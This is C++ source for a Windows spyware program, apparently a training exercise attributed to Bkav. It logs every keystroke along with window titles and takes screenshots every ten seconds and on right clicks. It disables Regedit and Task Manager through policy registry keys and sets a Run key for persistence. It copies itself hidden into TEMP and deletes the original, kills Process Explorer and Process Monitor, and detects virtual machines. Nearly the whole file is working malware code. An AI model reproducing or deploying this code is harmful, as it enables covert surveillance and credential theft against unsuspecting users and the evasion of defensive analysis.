//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// Description: File virus bai 1
// Author: SonTDc
// Copyright, Bkav, 2013-2014. All rights reserved
// Additional information: File virus bao gom cac hanh vi: Keylogger, Screen Capture, Disable registry and task manager
// anti VirtualBox and Process explorer, process monitor
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "SpywareVirus.h"

#include <TlHelp32.h>
#define MAX_LOADSTRING 100

#pragma warning(disable: 4996)
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Advapi32.lib")


#define ANYSIZE_ARRAY 1       

const TCHAR szSlice[] = L"\\";
const TCHAR szSpace[] = L"_";
HHOOK g_hhkLowLevelKbd = NULL;
HHOOK g_hhkMouse = NULL;
TCHAR g_lpFolderVirus[MAX_PATH];
TCHAR g_szWndInfo[MAX_LOADSTRING];
TCHAR g_lpCaptureFile[MAX_LOADSTRING];

//----------------------------------------------------------------------------------------
// Name: KeyboardHook
// Description: Hook Keyboard
// Parameter: int nCode, WPARAM wParam, LPARAM lParam
// Return:  if nCode < 0: return CallNextHookEx(g_hhkLowLevelKbd, nCode, wParam, lParam)
//			if nCode >= 0: hook Procedure didnot process the message
//----------------------------------------------------------------------------------------
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	DWORD dwNumByteWrittenLog = NULL;
	if (nCode == HC_ACTION)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			PKBDLLHOOKSTRUCT pKbdLowLevelHook = (PKBDLLHOOKSTRUCT)lParam;
			TCHAR szKeyName[MAX_LOADSTRING] = L"";
			HWND hWnd = GetForegroundWindow();
			TCHAR szCurrentWndInfo[MAX_LOADSTRING];
			GetWindowText(hWnd, szCurrentWndInfo, MAX_LOADSTRING);
			TCHAR szKeyLogFileName[MAX_LOADSTRING] = L"KeyLog.txt";
			TCHAR lpKeyLogFile[MAX_PATH];
			lstrcpy(lpKeyLogFile, g_lpFolderVirus);
			lstrcat(lpKeyLogFile, szKeyLogFileName);

			HANDLE hKeyLog = CreateFile(lpKeyLogFile,
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ,
				NULL,
				OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);

			// Truong hop nhap phim o cua so khac
			if (lstrcmp(g_szWndInfo, szCurrentWndInfo) != 0)
			{
				lstrcpy(g_szWndInfo, szCurrentWndInfo);
				SetFilePointer(hKeyLog, 0, 0, FILE_END);
				WriteFile(hKeyLog, L"\r\n", lstrlen(L"\r\n") * 2, &dwNumByteWrittenLog, NULL);
				SetFilePointer(hKeyLog, 0, 0, FILE_END);
				WriteFile(hKeyLog, &g_szWndInfo, lstrlen(g_szWndInfo) * 2, &dwNumByteWrittenLog, NULL);
				SetFilePointer(hKeyLog, 0, 0, FILE_END);
				WriteFile(hKeyLog, L": ", lstrlen(L": ") * 2, &dwNumByteWrittenLog, NULL);
			}

			char s;

			// Nhan biet chu hoa chu thuong
			if (pKbdLowLevelHook->vkCode >= 0x41 && pKbdLowLevelHook->vkCode <= 0x5A)
			{
				SHORT cxShift = GetKeyState(VK_SHIFT);
				SHORT cxCaps = GetKeyState(VK_CAPITAL);
				if ((cxShift == 0 && cxCaps == 0) || (cxShift == 1 && cxCaps == 1))
				{
					s = char(pKbdLowLevelHook->vkCode);
				}
				else
				{
					s = char(pKbdLowLevelHook->vkCode + 32);
				}
				size_t outSize;
				mbstowcs_s(&outSize, szKeyName, &s, 1);
			}

			// Nhan biet cac phim bam dac biet
			switch (pKbdLowLevelHook->vkCode)
			{
			case VK_RETURN:
				lstrcpy(szKeyName, L"[Enter]");
				break;
			case VK_LSHIFT:
				lstrcpy(szKeyName, L"[LeftShift]");
				break;
			case VK_RSHIFT:
				lstrcpy(szKeyName, L"[RightShift]");
				break;
			case VK_LCONTROL:
				lstrcpy(szKeyName, L"[LeftCtrl]");
				break;
			case VK_RCONTROL:
				lstrcpy(szKeyName, L"[RightCtrl]");
				break;
			case VK_ESCAPE:
				lstrcpy(szKeyName, L"[Esc]");
				break;
			case VK_SPACE:
				lstrcpy(szKeyName, L"[Space]");
				break;
			case VK_LMENU:
				lstrcpy(szKeyName, L"[LeftAlt]");
				break;
			case VK_RMENU:
				lstrcpy(szKeyName, L"[RightAlt]");
				break;
			default:
				break;
			}

			SetFilePointer(hKeyLog, 0, 0, FILE_END);
			WriteFile(hKeyLog, &szKeyName, lstrlen(szKeyName) * 2, &dwNumByteWrittenLog, NULL);
			CloseHandle(hKeyLog);
		}
	}
	return CallNextHookEx(g_hhkLowLevelKbd, nCode, wParam, lParam);
}

//------------------------------------------------------------------------------------------
// Name: ScreenShot
// Description: Capture Screen
// Parameter: char *BmpName, DWORD dwWidth, DWORD dwHeigth, DWORD sourceX, DWORD sourceY
// Return: no return
//------------------------------------------------------------------------------------------
void ScreenShot(TCHAR *BmpName, DWORD dwWidth, DWORD dwHeight, DWORD dwSourceX, DWORD dwSourceY)
{
	DWORD dwBmpFileWritten;
	HWND hWndDesktop = GetDesktopWindow();
	HDC hDevC = GetDC(hWndDesktop);

	DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (dwWidth*dwHeight * 4));
	char *BmpFileData = (char*)GlobalAlloc(0x0040, dwFileSize);
	PBITMAPFILEHEADER pBmpFileHeader = (PBITMAPFILEHEADER)BmpFileData;
	PBITMAPINFOHEADER pBmpInfoHeader = (PBITMAPINFOHEADER)&BmpFileData[sizeof(BITMAPFILEHEADER)];

	pBmpFileHeader->bfType = 0x4D42;
	pBmpFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
	pBmpFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	pBmpInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
	pBmpInfoHeader->biPlanes = 1;
	pBmpInfoHeader->biBitCount = 24;
	pBmpInfoHeader->biCompression = BI_RGB;
	pBmpInfoHeader->biHeight = dwHeight;
	pBmpInfoHeader->biWidth = dwWidth;

	RGBTRIPLE *Image = (RGBTRIPLE*)&BmpFileData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];

	HDC hCaptureDC = CreateCompatibleDC(hDevC);
	HBITMAP hCaptureBmp = CreateCompatibleBitmap(hDevC, dwWidth, dwHeight);
	SelectObject(hCaptureDC, hCaptureBmp);
	//SetStretchBltMode(hCaptureDC, WHITEONBLACK);
	//StretchBlt(hCaptureDC, 0, 0, dwWidth, dwHeight, hDevC, dwSourceX, dwSourceY, SRCCOPY,);
	BitBlt(hCaptureDC, 0, 0, dwWidth, dwHeight, hDevC, dwSourceX, dwSourceY, SRCCOPY | CAPTUREBLT);
	GetDIBits(hCaptureDC, hCaptureBmp, 0, dwHeight, Image, (LPBITMAPINFO)pBmpInfoHeader, DIB_RGB_COLORS);

	TCHAR nameOfCapture[MAX_LOADSTRING];
	lstrcpy(nameOfCapture, BmpName);
	HANDLE hBmpFile = CreateFile(nameOfCapture,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		0,
		CREATE_ALWAYS,
		0,
		0);
	WriteFile(hBmpFile, BmpFileData, dwFileSize, &dwBmpFileWritten, NULL);
	CloseHandle(hBmpFile);
	GlobalFree(BmpFileData);
}

//------------------------------------------------------------------------------------------
// Name: SetNameOfFileCapture
// Description: dat ten cho file screen capture
// Parameter: NULL
// Return: TCHAR
//------------------------------------------------------------------------------------------
void SetNameOfFileCapture()
{
	SYSTEMTIME systime;
	GetSystemTime(&systime);
	lstrcpy(g_lpCaptureFile, g_lpFolderVirus);
	lstrcat(g_lpCaptureFile, L"ScreenCapture");
	TCHAR tTempName[MAX_LOADSTRING];
	wsprintf(tTempName, L"%d", systime.wMilliseconds);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L"_");
	wsprintf(tTempName, L"%d", systime.wSecond);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L"_");
	wsprintf(tTempName, L"%d", systime.wMinute);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L"_");
	wsprintf(tTempName, L"%d", systime.wHour);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L"_");
	wsprintf(tTempName, L"%d", systime.wDay);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L"_");
	wsprintf(tTempName, L"%d", systime.wMonth);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L"_");
	wsprintf(tTempName, L"%d", systime.wYear);
	lstrcat(g_lpCaptureFile, tTempName);
	lstrcat(g_lpCaptureFile, L".bmp");

}

//------------------------------------------------------------------------------------------
// Name: TakeScreenCapture
// Description: Xay ra moi 10s
// Parameter: LPVOID lpParam;
// return: DWORD
//------------------------------------------------------------------------------------------
DWORD WINAPI TakeScreenCapture(LPVOID lpParam)
{
	while (true)
	{
		HWND hWndDesktop = GetDesktopWindow();
		RECT rectDesktopParams;
		GetWindowRect(hWndDesktop, &rectDesktopParams);
		SetNameOfFileCapture();
		ScreenShot(g_lpCaptureFile,
			rectDesktopParams.right - rectDesktopParams.left,
			rectDesktopParams.bottom - rectDesktopParams.top,
			0,
			0);
		Sleep(10000);
	}
	return 0;
}

//------------------------------------------------------------------------------------------
// Name: MouseHook
// Description: Catch a mouse event: Capture a part of Screen
// Parameter: int nCode, WPARAM wParam, LPARAM lParam
// Return: if process then return CallNextHookEx() else no process
//------------------------------------------------------------------------------------------
LRESULT CALLBACK MouseHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	PMSLLHOOKSTRUCT pMouseHook = (PMSLLHOOKSTRUCT)lParam;
	if (wParam == WM_RBUTTONDOWN)
	{
		SetNameOfFileCapture();
		ScreenShot(g_lpCaptureFile,
			200,
			200,
			pMouseHook->pt.x - 100,
			pMouseHook->pt.y - 100);
	}
	return CallNextHookEx(g_hhkMouse, nCode, wParam, lParam);
}

//------------------------------------------------------------------------------------------
// Name: AntiVirtualMachine
// Description: Anti virtual Machine
// Parameter: LPVOID lpParam
// Return: 1 if done
//------------------------------------------------------------------------------------------
DWORD WINAPI AntiVirtualMachine(LPVOID lpParam)
{
	while (true)
		MessageBox(NULL, L"I am in VirtualMachine!", L"Error", NULL);
	return 1;
}

//------------------------------------------------------------------------------------------
// Name: DetectProcess
// Description: Detect virtualbox and Anti Process Monitor and Process explorer
// Parameter: LPVOID lpParameter
// Return: 0
//------------------------------------------------------------------------------------------
DWORD WINAPI DetectProcess(LPVOID lpParam)
{
	HANDLE hProcessSnapshot;
	HANDLE hProcess;
	PROCESSENTRY32 processEntry32;
	DWORD dwPriorityClass;
	DWORD dwThreadAntiVirtualMachine;
	DWORD dwThreadAntiMonitor;

	while (true)
	{
		Sleep(3000);
		hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnapshot == INVALID_HANDLE_VALUE)
		{
			return 0;
		}
		processEntry32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hProcessSnapshot, &processEntry32))
		{
			CloseHandle(hProcessSnapshot);
			return 0;
		}
		do
		{

			dwPriorityClass = 0;
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processEntry32.th32ProcessID);
			if (hProcess != NULL)
			{
				dwPriorityClass = GetPriorityClass(hProcess);
				CloseHandle(hProcess);
			}
			if (lstrcmp(processEntry32.szExeFile, L"VBoxTray.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"VBoxService.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"VMwareService.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"VMwareTray.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"VMwareUser.exe") == 0)
			{
				CreateThread(NULL, 0, AntiVirtualMachine, NULL, NULL, &dwThreadAntiVirtualMachine);

			}
			if (lstrcmp(processEntry32.szExeFile, L"procexp.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"procmon.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"Procexp64.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"Procmon64.exe") == 0 ||
				lstrcmp(processEntry32.szExeFile, L"svhost") == 0)
			{
				HANDLE hProcess1 = OpenProcess(PROCESS_TERMINATE, TRUE, processEntry32.th32ProcessID);
				if (TerminateProcess(hProcess1, -1) == 0)
				{
					MessageBox(NULL, L"Fail", L"Error", NULL);
				}
				CloseHandle(hProcess1);
				MessageBox(NULL, L"I have been followed by Process Explorer! Haha, Cancel it!", L"Error", NULL);
			}
		} while (Process32Next(hProcessSnapshot, &processEntry32));
	}
	CloseHandle(&dwThreadAntiVirtualMachine);
	CloseHandle(&dwThreadAntiMonitor);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	DWORD dwNumByteWritten;
	DWORD dwNumByteRead;
	TCHAR lpCurrentVirus[MAX_PATH] = L"";
	// Get path of temp folder
	TCHAR lpTempPathBuffer[MAX_PATH];
	GetTempPath(MAX_PATH, lpTempPathBuffer);

	// Create a folder to save data
	TCHAR szFolderVirusName[MAX_LOADSTRING] = L"\Virus Data\\";
	lstrcpy(g_lpFolderVirus, lpTempPathBuffer);
	lstrcat(g_lpFolderVirus, szFolderVirusName);

	CreateDirectory(g_lpFolderVirus, NULL);

	TCHAR szCurrentDirectoryFileName[MAX_LOADSTRING] = L"CurrentDirectory.txt";
	TCHAR lpCurrentDirectoryFile[MAX_PATH];
	lstrcpy(lpCurrentDirectoryFile, g_lpFolderVirus);
	lstrcat(lpCurrentDirectoryFile, szCurrentDirectoryFileName);

	HANDLE hCurrentDirectoryFile = CreateFile(lpCurrentDirectoryFile,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	TCHAR lpCurrentFolder[MAX_PATH];
	DWORD dwCurrentFolder = GetCurrentDirectory(MAX_PATH, lpCurrentFolder);
	lstrcat(lpCurrentFolder, szSlice);

	// Compare Current Directory run virus file and TEMP DIRECTORY
	if (lstrcmp(lpCurrentFolder, lpTempPathBuffer) != 0)
	{
		GetModuleFileName(NULL, lpCurrentVirus, MAX_PATH);

		TCHAR szVirusName[MAX_LOADSTRING] = L"VirusExe.exe";
		TCHAR lpVirus[MAX_PATH];
		lstrcpy(lpVirus, lpTempPathBuffer);
		lstrcat(lpVirus, szVirusName);

		// Copy to TEMP
		HANDLE hCurrentVirusFile = CreateFile(lpCurrentVirus,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		HANDLE hVirusFile = CreateFile(lpVirus,
			GENERIC_WRITE | GENERIC_READ,
			FILE_SHARE_WRITE | FILE_SHARE_READ,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN,
			NULL);

		TCHAR buffer[MAX_LOADSTRING];
		BOOL bResult;
		do
		{
			int sizeBuf = sizeof(buffer);
			bResult = ReadFile(hCurrentVirusFile,
				&buffer,
				100,
				&dwNumByteRead,
				NULL);
			SetFilePointer(hVirusFile, 0, 0, FILE_END);
			WriteFile(hVirusFile, &buffer, 100, &dwNumByteWritten, NULL);
		} while (bResult && dwNumByteRead != 0);
		CloseHandle(hCurrentVirusFile);
		CloseHandle(hVirusFile);

		// Write Current Directory if not TEMP
		WriteFile(hCurrentDirectoryFile, &lpCurrentVirus, lstrlen(lpCurrentVirus) * 2, &dwNumByteWritten, NULL);
		CloseHandle(hCurrentDirectoryFile);

		// Create new process to run virus in TEMP
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		if (CreateProcess(NULL, lpVirus, NULL, NULL, TRUE, 0, NULL, lpTempPathBuffer, &info, &processInfo))
		{

		}
		return 0;
	}
	TCHAR lpCurrentVirus2[100] = L"";
	ReadFile(hCurrentDirectoryFile, lpCurrentVirus2, MAX_PATH, &dwNumByteRead, NULL);
	CloseHandle(hCurrentDirectoryFile);
	DeleteFile(lpCurrentVirus2);

	// Hook Keyboard
	g_hhkLowLevelKbd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, NULL);

	// Hook Mouse
	g_hhkMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseHook, NULL, NULL);

	// Create a reg key
	HKEY hKey;
	DWORD dwValue = 1;
	TCHAR lpSystemRegKey[MAX_PATH] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

	// Key DisableRegistryTools to Disable Registry
	RegCreateKeyEx(HKEY_CURRENT_USER,
		lpSystemRegKey,
		0,
		NULL,
		0,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		NULL);

	RegSetValueEx(hKey,
		L"DisableRegistryTools",
		0,
		REG_DWORD,
		(LPBYTE)&dwValue,
		sizeof(dwValue));

	RegCloseKey(hKey);

	// Key DisableTaskMgr to Disable Task Manager
	RegCreateKeyEx(HKEY_CURRENT_USER,
		lpSystemRegKey,
		0,
		NULL,
		0,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		NULL);

	RegSetValueEx(hKey,
		L"DisableTaskMgr",
		0,
		REG_DWORD,
		(LPBYTE)&dwValue,
		sizeof(dwValue));

	RegCloseKey(hKey);

	WCHAR szStartupRegKeyData[MAX_LOADSTRING];
	lstrcpy(szStartupRegKeyData, lpTempPathBuffer);
	lstrcat(szStartupRegKeyData, L"VirusExe.exe \/ startup");
	TCHAR lpRunRegKey[MAX_PATH] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	// Key to set Startup Program
	RegCreateKeyEx(HKEY_CURRENT_USER,
		lpRunRegKey,
		0,
		NULL,
		0,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		NULL);

	RegSetValueEx(hKey,
		L"VirusExe",
		0,
		REG_SZ,
		(LPBYTE)szStartupRegKeyData,
		sizeof(szStartupRegKeyData));

	RegCloseKey(hKey);

	// Create a Thread To capture Screen
	DWORD dwThreadCaptureScreenId = NULL;
	CreateThread(NULL, 0, TakeScreenCapture, NULL, NULL, &dwThreadCaptureScreenId);

	// Create a Thread To Detect virtualbox and Processexp and Monprocess
	DWORD dwThreadDetectProcess = NULL;
	CreateThread(NULL, 0, DetectProcess, NULL, NULL, &dwThreadDetectProcess);

	MSG msg;
	while (GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(g_hhkLowLevelKbd);
	UnhookWindowsHookEx(g_hhkMouse);
	CloseHandle(&dwThreadCaptureScreenId);
	CloseHandle(&dwThreadDetectProcess);

	return 0;
}